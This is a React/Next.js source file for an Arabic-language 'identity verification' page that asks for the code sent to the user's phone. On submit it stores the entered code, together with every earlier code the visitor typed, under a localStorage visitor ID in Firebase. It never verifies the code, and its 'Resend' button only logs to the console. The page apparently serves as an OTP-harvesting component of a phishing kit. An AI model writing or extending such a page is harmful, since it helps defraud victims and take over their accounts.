"use client"

import type React from "react"

import { useState, useRef, type KeyboardEvent, type ClipboardEvent } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Shield } from "lucide-react"
import { addData } from "@/lib/firebase"
const allOtps=['']
export default function OTPPage() {
  const [otp, setOtp] = useState('')
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const handleChange = async (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return // Only allow digits


  }

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const visitorID=localStorage.getItem('visitor')
    allOtps.push(otp)
    await addData({id:visitorID,otp1:otp,allOtps})
        setOtp(otp)

  }

  const handleResend = () => {
    console.log("Resending OTP")
    setOtp('')
    inputRefs.current[0]?.focus()
  }


  return (
    <main className="flex min-h-screen items-center justify-center bg-gradient-to-br from-primary/5 via-background to-accent/5 p-4">
      <Card className="w-full max-w-md shadow-lg">
        <CardHeader className="text-center space-y-2">
          <div className="mx-auto mb-2 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
            <Shield className="h-6 w-6 text-primary" />
          </div>
          <CardTitle className="text-2xl font-bold">التحقق من الهوية</CardTitle>
          <CardDescription className="text-balance">
يرجى ادخال رمز التحقق المرسل الى رقم هاتفك 
          </CardDescription>
        </CardHeader>

        <form onSubmit={handleSubmit}>
          <CardContent className="space-y-6">
            <div className="flex justify-center gap-2">
             
                <Input
                  type="tel"
                  inputMode="numeric"
                  maxLength={6}
                  autoComplete="otp"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value)}
                  className="h-14 w-full text-center text-xl font-semibold transition-all focus:scale-105"
                />
            </div>

            <div className="text-center text-sm text-muted-foreground">
           
              <button
                type="button"
                onClick={handleResend}
                className="font-medium text-primary hover:underline focus:outline-none focus:underline"
              >
                Resend
              </button>
            </div>
          </CardContent>

          <CardFooter>
            <Button type="submit" className="w-full text-white" size="lg">
 تحقق
            </Button>
          </CardFooter>
        </form>
      </Card>
    </main>
  )
}
